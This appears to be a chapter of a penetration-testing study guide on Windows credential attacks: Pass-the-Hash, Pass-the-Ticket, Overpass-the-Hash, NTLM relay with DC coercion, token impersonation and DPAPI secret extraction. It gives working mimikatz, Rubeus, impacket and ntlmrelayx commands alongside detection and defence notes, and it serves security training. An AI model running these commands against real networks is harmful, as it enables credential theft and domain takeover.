---
title: "11. Advanced Password Attacks"
order: 11
part: "Password & Hash Attacks"
description: "Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, NTLM relay, token impersonation and DPAPI abuse."
---

A conceptual distinction, often confused:

| Technique | Input | Output/use | Protocol |
| --- | --- | --- | --- |
| **Pass-the-Hash (PtH)** | NT hash | Direct NTLM authentication | NTLM |
| **Pass-the-Ticket (PtT)** | Kerberos ticket (.kirbi/.ccache) | Access a service with the ticket | Kerberos |
| **Overpass-the-Hash (Pass-the-Key)** | NT/AES key | First get a TGT, then Kerberos | NTLM to Kerberos bridge |
| **NTLM Relay** | Captured authentication flow | Forward to another target | NTLM |
| **Token impersonation** | A running process token | Impersonate the user | Windows token |
| **DPAPI abuse** | Master key + encrypted blob | Decrypt a stored password/secret | DPAPI |

## 11.1 Pass-the-Hash (PtH)

NTLM authentication does not use the password itself but the **NT hash** derived from it: the client produces a response by encrypting the challenge sent by the server with the NT hash. Therefore you do not need to know the password: **the NT hash is enough**. This is possible because the NT hash is **unsalted** and feeds directly into the challenge/response computation (see Section 10.1). NetNTLMv1/v2, by contrast, is **not** an NT hash (it is a one-time response bound to the challenge), so it cannot be used for PtH.

```
# hash spray with netexec: which hosts is this hash local admin on? (lateral movement discovery)
nxc smb 10.10.10.0/24 -u Administrator -H <NThash>
nxc smb 10.10.10.0/24 -u Administrator -H <NThash> --local-auth    # local account (not domain)
# "Pwn3d!" output means you're admin on that host
# Remote command/shell (impacket) - all take -hashes :NT
impacket-psexec Administrator@10.10.10.10 -hashes :<NThash>        # SYSTEM, installs a service → noisy/logged
impacket-wmiexec DOMAIN/Administrator@10.10.10.10 -hashes :<NThash>  # WMI, session user, quieter
impacket-smbexec DOMAIN/Administrator@10.10.10.10 -hashes :<NThash>  # Service over SMB, semi-interactive
impacket-atexec DOMAIN/Administrator@10.10.10.10 -hashes :<NThash> whoami  # Task Scheduler, single command
impacket-dcomexec DOMAIN/Administrator@10.10.10.10 -hashes :<NThash>  # DCOM (MMC20/ShellWindows)
# WinRM (if 5985/5986 open - most stable interactive)
evil-winrm -i 10.10.10.10 -u Administrator -H <NThash>
# Via RDP (Restricted Admin mode must be ON on target)
xfreerdp /u:Administrator /pth:<NThash> /v:10.10.10.10
# mimikatz: start a new process with NT hash (that process now authenticates as the hash owner)
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NThash> /run:cmd.exe
```

**The `-hashes` format is `LMhash:NThash`**; if there is no LM, it is left empty with a leading `:`, giving `:<NThash>`. This is a frequently encountered detail.

**Exec tool selection guide (OPSEC/functionality):**

| Tool | Mechanism | Privilege | Noise/Footprint |
| --- | --- | --- | --- |
| `psexec` | SMB + temporary service (RemComSvc) | SYSTEM | High (service installation, Event 7045) |
| `wmiexec` | WMI (DCOM 135 + high port) | Session user | Low (no service) |
| `smbexec` | SMB + temporary service | SYSTEM | Medium |
| `atexec` | Task Scheduler (ATSvc) | - | Medium (scheduled task trace) |
| `dcomexec` | DCOM object (e.g. MMC20.Application) | Session user | Low to medium |
| `evil-winrm` | WinRM/PSRemoting | Session user | WinRM logs |

**When to use `--local-auth`?** When the hash belongs to a *local* account (SAM), not a domain account. For example, if the same local Administrator password is used on every machine, an NT hash obtained from one machine can open the whole network ("local admin password reuse").

**LAPS impact:** Microsoft LAPS (Local Administrator Password Solution) makes each machine's local admin password unique and random, stores it in AD, and changes it through periodic rotation. This **breaks** reuse of the local admin hash (that is, network-wide spread via PtH): one machine's hash is useless on another machine. From the attacker's point of view, the goal becomes seizing the permission to read the LAPS password from AD (the `ms-Mcs-AdmPwd` attribute, or the encrypted attribute in Windows LAPS).

**Detection/Defense (PtH):**

- At the endpoint, security event **4624 Logon Type 9** (`Logon Process: seclogo`, `Authentication Package: Negotiate`) is the classic signature of mimikatz `sekurlsa::pth`. Correlate with Sysmon Event **10** (lsass access).
- At the DC, **4776** (NTLM credential validation) anomaly for the same account.
- `psexec` produces Event **7045** (new service) + **4697**.
- Defense: **Credential Guard**, **LAPS** (breaks local admin reuse), SMB signing, restrict network logon with local accounts (Protected Users group, "Deny access to this computer from the network").

**Note:** PtH requires an **NT hash**; it does not work with NetNTLMv2 (that is cracked or relayed). `-hashes :NT` means a leading `:` (LM empty). `psexec` gives SYSTEM but is noisy; `wmiexec` is quiet. For RDP PtH, **Restricted Admin** must be enabled on the target.

## 11.2 Pass-the-Ticket (PtT)

Here it is not a hash but a **Kerberos ticket** that is stolen and injected. In Kerberos, a TGT or service ticket (TGS/ST) proves the identity of its owner; if you place the ticket itself into another session, you act with that identity. Tickets are obtained from memory (`sekurlsa::tickets /export`, `Rubeus dump`) or from disk.

Format difference: Windows tickets use **`.kirbi`**, Linux/impacket use **`.ccache`**; they are converted with `ticketConverter`.

```
# Rubeus (Windows) - inject the ticket into the current session
Rubeus.exe ptt /ticket:ticket.kirbi
# Linux (impacket) - make the ccache the "current ticket" via env variable
export KRB5CCNAME=/path/ticket.ccache
impacket-psexec -k -no-pass DOMAIN/user@host.corp.local   # -k: use Kerberos, -no-pass: don't prompt for password
# Ticket conversion (both directions)
impacket-ticketConverter ticket.kirbi ticket.ccache       # kirbi → ccache
impacket-ticketConverter ticket.ccache ticket.kirbi       # ccache → kirbi
```

`-k -no-pass` tells impacket tools: "authenticate with Kerberos, use the ticket in `KRB5CCNAME`, do not ask me for a password/hash." You must connect to the host by **FQDN, not IP** (Kerberos is name-based; the SPN does not match an IP, a common mistake). If the clock difference is greater than 5 minutes, Kerberos rejects the request, so synchronize with the DC using `ntpdate`/`rdate`.

**Detection/Defense (PtT):** Use of a stolen TGT from an IP/host it is not normally associated with; anomalies in **4768/4769** events; geographic/temporal inconsistency for the same ticket. Defense: short ticket lifetime, reset the `krbtgt` password (twice) for suspect accounts, Protected Users group.

## 11.3 Overpass-the-Hash (Pass-the-Key)

You use the NT (or AES) hash to request a **full Kerberos TGT** from the DC; then you access Kerberos services with that TGT. It is a "bridge" from NTLM to Kerberos: you have NTLM material but want to move in the Kerberos world (e.g. Kerberos-only services, fewer NTLM traces). When done with an AES key it is **more OPSEC-friendly**, because using RC4 (etype 0x17) in an AES environment creates an anomaly (RC4 downgrade detection).

```
# Rubeus (Windows) - request TGT with RC4 (NT hash) or AES256, inject into current session (/ptt)
Rubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:<NThash> /ptt
Rubeus.exe asktgt /user:Administrator /domain:corp.local /aes256:<AESkey> /nowrap /opsec /ptt
# impacket (Linux) - get the TGT as .ccache, then use it with -k -no-pass
impacket-getTGT corp.local/Administrator -hashes :<NThash>        # → Administrator.ccache
impacket-getTGT corp.local/Administrator -aesKey <AESkey>
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass corp.local/Administrator@host.corp.local
```

Rubeus flags: `/rc4:` NT hash (as an RC4-HMAC key); `/aes256:` AES256 key; `/ptt` loads the ticket into the current session; `/nowrap` outputs base64 without line wrapping (for easier copying); `/opsec` a request flow that leaves fewer traces. To obtain the AES key, secretsdump/`-just-dc` also dumps the Kerberos keys (see 10.2.7).

**RC4 vs AES OPSEC:** If the domain uses AES by default, requesting a TGT with RC4 (`/rc4`) appears as **etype 0x17** in DC logs and triggers an "encryption downgrade" alert. With `/aes256` the same request blends in with normal traffic.

**Detection/Defense:** **4768** (TGT request), especially from an unexpected host or with an RC4 etype. Defense: enforce AES, disable RC4 (make the etype 0x17 downgrade visible/blocked), Protected Users.

**Note:** **PtT** = carry a ready-made ticket; **OPtH/PtK** = generate a **new TGT** from a hash. When OPtH is done with AES, it bypasses RC4 downgrade detection (4769 etype 0x17).

## 11.4 NTLM Relay

**Instead of cracking a captured NTLM authentication, you forward it as-is to another target (relay).** If the victim is highly privileged, you do work on the target with that privilege, and you never need to crack the hash. Mechanism: the NTLM challenge/response does not cryptographically bind the client to *which server* it is connecting to; you can step in and pass the response to a third server.

**Mandatory condition:** The target must have **SMB signing OFF** (or, for an LDAP relay, LDAP signing/channel binding off). If signing is enabled, the relayed session is unsigned and therefore rejected. Also, relaying back to the same machine (reflection) has been blocked since **MS08-068**.

```
# 1) Find relayable targets (ones with SMB signing off)
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt
# 2) TURN OFF Responder's own SMB/HTTP servers (ntlmrelayx will listen):
#    /etc/responder/Responder.conf → SMB = Off, HTTP = Off
responder -I eth0                 # Capture authentication via LLMNR/NBT-NS/MDNS poisoning
# 3) relay with ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support                        # relay to matching hosts, dump SAM
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'powershell -enc <b64>'   # run command
impacket-ntlmrelayx -t smb://10.10.10.10 -smb2support -i                # interactive SMB client (connect to local port)
impacket-ntlmrelayx -tf targets.txt -smb2support -socks                 # keep the session open, use with proxychains
# LDAP/LDAPS relay → ACL-based privesc
impacket-ntlmrelayx -t ldaps://DC --escalate-user lowpriv              # add DCSync right to lowpriv
impacket-ntlmrelayx -t ldaps://DC --delegate-access                    # delegation to attacker computer account
# ADCS ESC8 (relay to Web Enrollment HTTP endpoint → get certificate)
impacket-ntlmrelayx -t http://adcs.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# IPv6/WPAD (together with mitm6)
impacket-ntlmrelayx -6 -t ldaps://DC -wh attacker-wpad --delegate-access
```

Flags: `-t` single target, `-tf` target file, `-c` command to run when the relay succeeds, `-i` opens a local interactive shell for the relayed session, `-socks` keeps sessions open and serves a SOCKS proxy (multiple uses via proxychains), `-smb2support` for SMB2/3 targets, `--escalate-user` adds DCSync rights to the specified user in an LDAP relay, `--delegate-access` grants delegation to an attacker-controlled account for RBCD, `--adcs --template` certificate template in ESC8, `-wh` WPAD host, `-6` IPv6.

**Triggering the relay, coercion:** For a relay you need a victim to authenticate to you. Either passively (LLMNR/NBT-NS poisoning with Responder) or with active **coercion**:

| Tool | Protocol / Exploit | CVE | Note |
| --- | --- | --- | --- |
| **PetitPotam** | MS-EFSRPC | CVE-2021-36942 (unauth variant) | Coerces the machine account; the classic pairing with ADCS ESC8 |
| **printerbug** (MS-RPRN) | Print Spooler RPC | - (the patch changed on MS's "won't fix" list) | Spooler must be enabled; requires credentials |
| **DFSCoerce** | MS-DFSNM | - | DFS service; authenticated |
| **ShadowCoerce** | MS-FSRVP | CVE-2022-30154 | - |
| **Coercer** | tries all of them automatically | - | Meta-tool |

```
python3 PetitPotam.py <attacker_ip> <dc_ip>            # force the DC to authenticate to the attacker
python3 printerbug.py 'corp/user:pass'@<target> <attacker_ip>
Coercer.py coerce -l <attacker_ip> -t <target_ip> -u user -p pass
```

**Classic ESC8 chain:** `PetitPotam → coerce the DC → relay to the ADCS HTTP endpoint with ntlmrelayx → obtain a machine certificate on behalf of the DC → request a TGT with the certificate (Rubeus/certipy) → DCSync`. See the related ADCS attacks.

**Detection/Defense (NTLM Relay):**

- The defensive key is **signing/channel binding**: **enforce** SMB signing, enable LDAP signing + LDAP channel binding, EPA (Extended Protection for Authentication) on web services. These make relay cryptographically impossible.
- Disable LLMNR/NBT-NS (GPO) to cut off Responder poisoning. Disable mDNS.
- Remove ADCS Web Enrollment / enforce EPA (ESC8).
- Disable the Print Spooler if unnecessary (printerbug), and apply the relevant patches for PetitPotam.
- Detection: 4624 NTLM logons coming from unexpected sources, abnormal authentication by machine accounts, NTLM to many different hosts in a short time.

**Note:** For an NTLM relay the target must have **SMB signing off**; relaying back to the same machine (reflection) has been blocked since MS08-068. An LDAP/LDAPS relay is prevented only by **LDAP signing + channel binding** together.

## 11.5 Token impersonation and other representations

Without any password/hash, you borrow the security token of a process that is **already running** on the system and behave like that user. The logic: Windows gives every process an access token carrying the rights of the logged-on user; if you have the `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` rights (service accounts usually have them), you can impersonate another token.

```
# Meterpreter - incognito
load incognito
list_tokens -u                            # usable delegation/impersonation tokens
impersonate_token "CORP\\Administrator"   # double backslash
```

- **Rubeus tgtdeleg:** Without requiring high privilege, it abuses the Kerberos GSS-API delegation in the current user's session to extract the **current user's TGT** (useful in unconstrained delegation scenarios and for general ticket collection):

```
  Rubeus.exe tgtdeleg /nowrap
```

- **Potato family** (JuicyPotato, PrintSpoofer, RoguePotato, GodPotato): local escalation from a service account that has `SeImpersonatePrivilege` to SYSTEM; relies on token manipulation (see the local privesc section).

**Detection/Defense:** Token manipulation is visible at the endpoint with EDR (abnormal `DuplicateTokenEx`/`ImpersonateLoggedOnUser`). Defense: do not grant unnecessary `SeImpersonatePrivilege` to service accounts, use gMSA.

## 11.6 DPAPI abuse

**DPAPI (Data Protection API)** is the system with which Windows encrypts user secrets (browser-saved passwords, Wi-Fi keys, RDP credentials, Credential Manager, some application secrets). The encryption key is tied to a **master key** derived from the user's password (or, for a DC, from the machine key). If the master key is seized, all protected blobs are decrypted even if the user is not currently logged in.

```
# mimikatz - extract master keys from memory (if user is logged in)
sekurlsa::dpapi                            # {GUID}:SHA1 master key mappings from LSASS
# mimikatz - decrypt a master key file
dpapi::masterkey /in:"%appdata%\...\Protect\<SID>\<GUID>" /sid:<SID> /password:<password>
dpapi::masterkey /in:... /system           # SYSTEM master key (requires DPAPI_SYSTEM)
lsadump::secrets                           # LSA secrets including DPAPI_SYSTEM (via SysKey)
# Domain backup key (from DC - decrypts all users' master keys)
lsadump::backupkeys /system:DC /export
# Decrypt the protected blob (e.g. Credential file)
dpapi::cred /in:"%appdata%\...\Credentials\<file>"
```

**SharpDPAPI** (C# port, GhostPack) for triage without dropping mimikatz to disk:

```
SharpDPAPI.exe triage          # current user's Credential/Vault/RDP secrets
SharpDPAPI.exe machinetriage   # SYSTEM/machine secrets
SharpDPAPI.exe backupkey /server:dc.corp.local   # pull the domain DPAPI backup key
SharpDPAPI.exe credentials /pvk:<backupkey.pvk>   # decrypt user creds with backup key
```

**Why it is powerful:** If you seize the domain DPAPI **backup key** (stored on the DC, never changes), you can decrypt the DPAPI secrets of **every user** in the domain without knowing their passwords. For this reason the backup key is considered a "permanent domain secret."

**Detection/Defense:** LSASS access (Sysmon 10) and abnormal RPC of `lsadump::backupkeys` on the DC; bulk access to master key files. Defense: Credential Guard, LSASS protection on the DC, restrict backup key access.

## 11.7 Advanced cracking techniques (cracking continued)

On top of the hashcat/John foundation from Section 10, for hard passwords:

- **Rule stacking:** Apply multiple rule files on top of each other, `-r r1.rule -r r2.rule`. Combinations grow multiplicatively (r1 × r2 rule count), coverage increases but so does the time.
- **Combinator / hybrid:** Combine two wordlists (`-a 1`), or wordlist + mask (`-a 6`/`-a 7`). Ideal for "password + year/special character" patterns (e.g. `Summer` + `2024!`).
- **Mask attack (patterned brute):** If the policy is known (e.g. "at least 1 uppercase, 1 digit, 8+ characters"), you narrow the search space enormously with a mask (`-a 3 -1 ?l?u ?1?1?1?1?1?d?d?s`). Far more efficient than pure brute force.
- **PRINCE** (PRobability INfinite Chained Elements): Produces likely *compound* passwords by chaining wordlist words (e.g. `red` + `dragon` + `99`), catching combinations that are not in the wordlist but that people create. With the `princeprocessor | hashcat ... -a 0` pipeline.
- **Distributed cracking:** **Hashtopolis** for coordinating many GPUs/many machines (distributes hashcat in a server-agent architecture; splits a large workload). For bcrypt/large NTDS jobs where a single GPU is not enough.

**Decision guide:** Fast hash (NT/NetNTLMv2) + GPU → heavy rules + mask are fair game. Slow hash (bcrypt) → only the most likely targeted wordlist; keep PRINCE/rule stacking limited. If nothing can be cracked → stop cracking and *use* the hash you have via **PtH/relay** (the main idea of this section).

**Common mistakes:**

- **PtH** requires an NT hash, it does not work with NetNTLMv2. **PtT** carries a ticket, **OPtH/PtK** generates hash→TGT.
- For an NTLM relay the target must have **SMB signing off**; relaying back to the same machine (reflection) has been blocked since MS08-068; an LDAP relay is prevented by signing + channel binding.
- `impacket-psexec` gives SYSTEM but installs a service (noisy/logged); `wmiexec`/`dcomexec`/`atexec` are quieter.
- `-hashes :NT` means a leading `:` (LM empty).
- Overpass-the-hash with **AES** bypasses RC4 downgrade detection (4769/4768 etype 0x17).
- With Kerberos tools, connect to the host by **FQDN** (the SPN does not match an IP); a clock difference greater than 5 minutes breaks Kerberos.
- **LAPS** breaks local admin hash reuse (and therefore PtH spread); the domain DPAPI **backup key** opens all user secrets.
